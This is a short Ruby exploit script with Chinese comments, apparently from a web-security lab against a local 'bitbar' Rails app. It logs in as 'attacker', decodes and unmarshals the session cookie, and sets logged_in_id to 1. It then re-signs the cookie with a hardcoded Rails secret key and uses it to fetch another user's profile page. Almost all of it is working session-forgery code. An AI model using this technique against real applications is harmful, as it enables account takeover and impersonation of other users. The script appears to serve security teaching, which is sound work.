require 'mechanize'
require 'net/http'
SESSION = '_bitbar_session'
RAILS_SECRET = '0a5bfbbb62856b9781baa6160ecfd00b359d3ee3752384c2f47ceb45eada62f24ee1cbb6e7b0ae3095f70b0a302a2d2ba9aadf7bc686a49c8bac27464f9acb08'


# 模拟登陆
agent = Mechanize.new 	#实例化Mechanize对象
url = "http://localhost:3000/login"  
page = agent.get(url)
form = page.forms.first
form['username'] = form['password'] = 'attacker' # 使用attacker的信息填写表单
agent.submit form # 提交表单

cookie = agent.cookie_jar.jar['localhost']['/'][SESSION].to_s.sub("#{SESSION}=", '') #返回cookie
cookie_value, cookie_signature = cookie.split('--')  #分离签名
raw_session = Base64.decode64(cookie_value) #BASE64解码
session = Marshal.load(raw_session) #反序列化

puts session #打印cookie

session['logged_in_id'] = 1
cookie_value = Base64.encode64(Marshal.dump(session)).split.join # 伪造前半部分

cookie_signature = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, RAILS_SECRET, cookie_value)
cookie_full = "#{SESSION}=#{cookie_value}--#{cookie_signature}"  #签名并合并
puts "document.cookie='#{cookie_full}';" #打印完整的cookie

url = URI('http://localhost:3000/profile')
http = Net::HTTP.new(url.host, url.port)
header = {'Cookie':cookie_full} #使用伪造的cookie访问
response = http.get(url,header)
puts response.body  #查看相关字段